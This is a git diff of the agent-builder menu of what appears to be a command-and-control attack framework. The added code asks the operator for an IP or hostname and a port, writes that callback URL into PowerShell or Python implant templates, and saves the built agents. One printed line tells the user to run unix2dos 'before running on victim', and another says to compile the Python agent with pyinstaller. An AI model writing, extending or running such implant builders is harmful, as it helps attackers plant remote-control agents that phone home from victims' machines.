@@ -268,19 +268,45 @@ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmomNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.dNNNNNNNN
 		questions = {'type':'list',
 					 'name':'Section',
 					 'message': 'Choose an agent to build',
-					 'choices':['Python (Linux Elf)','Windows PowerShell']}
+					 'choices':['Python 3','Windows PowerShell']}
 		answers = prompt(questions, style=custom_style_1)
 		print(answers['Section'])
 		if (answers['Section'] == 'Windows PowerShell'):
-			print("Editing Windows PowerShell Agent")
-
-
-
-		elif (answers['Section'] == 'Python (Linux Elf)'):
 			ip_port_question = [{
 			'type':'input',
 			'name':'ip',
-			'message':'Enter IP or Hostname in the folowing format  90.80.70.60 or chrisja.info'},
+			'message':'Enter IP or Hostname in the following format 90.80.70.60 or chrisja.info'
+			},
+			{'type':'input',
+			'name':'port',
+			'message':'Enter Port'}
+			]
+			answers2 = prompt(ip_port_question,style=custom_style_1)
+			try:
+				with open('Agents/Agent.ps1','r') as f:
+					data = f.readlines()
+				f.close()
+				new_url = "https://{}:{}".format(answers2['ip'],answers2['port'])
+				data[57] = "$url = \"{}\"\n".format(new_url)
+				with open("Agents/Created_Agents/Agent.ps1","w") as f:
+					f.writelines(data)
+				f.close()
+				print(Style.BRIGHT)
+				print(Fore.GREEN + "*** Produced New Agent.ps1 file... ***")
+				print(Fore.GREEN + "*** File Written to Agents/Created_Agents/Agent.ps1... ***")
+				print(Fore.GREEN + "*** You may need to run unix2dos before running on victim... ***")
+				print(Style.RESET_ALL)
+			except:
+				print(Style.BRIGHT)
+				print(Fore.RED + "FAILED TO CREATE AGENT CHECK /AGENTS FOR SOURCE FILES")
+				print(Style.RESET_ALL)
+
+
+		elif (answers['Section'] == 'Python 3'):
+			ip_port_question = [{
+			'type':'input',
+			'name':'ip',
+			'message':'Enter IP or Hostname in the following format  90.80.70.60 or chrisja.info'},
 			{
 			'type':'input',
 			'name':'port',
@@ -288,20 +314,24 @@ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmomNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.dNNNNNNNN
 
 			}]
 			answers2 = prompt(ip_port_question, style=custom_style_1)
-			print('Editing Python Agent and compiling into ELF')
-			with open('Agents/agent.py','r') as f:
-				data = f.readlines()
-			f.close()
-			new_url = "https://{}:{}/".format(answers2['ip'],answers2['port'])
-			data[11] = "url = \"{}\"\n".format(new_url)
-			with open("Agents/Created_Agents/Agent.py",'w') as f:
-				f.writelines(data)
-			f.close()
-			print(Style.BRIGHT)
-			print(Fore.GREEN + "*** Produced New Agent.py file... ***")
-			print(Fore.GREEN + "*** File Written to Agents/Created_Agents/Agent.py... ***")
-			print(Fore.GREEN + "*** Run pyinstaller Agent.py to produce ELF... ***")
-			print(Style.RESET_ALL)
+			try:
+				with open('Agents/agent.py','r') as f:
+					data = f.readlines()
+				f.close()
+				new_url = "https://{}:{}/".format(answers2['ip'],answers2['port'])
+				data[11] = "url = \"{}\"\n".format(new_url)
+				with open("Agents/Created_Agents/Agent.py",'w') as f:
+					f.writelines(data)
+				f.close()
+				print(Style.BRIGHT)
+				print(Fore.GREEN + "*** Produced New Agent.py file... ***")
+				print(Fore.GREEN + "*** File Written to Agents/Created_Agents/Agent.py... ***")
+				print(Fore.GREEN + "*** Run pyinstaller Agent.py to produce ELF... ***")
+				print(Style.RESET_ALL)
+			except:
+				print(Style.BRIGHT)
+				print(Fore.RED + "FAILED TO CREATE AGENT CHECK /AGENTS FOR SOURCE FILES")
+				print(Style.RESET_ALL)
 
 
 
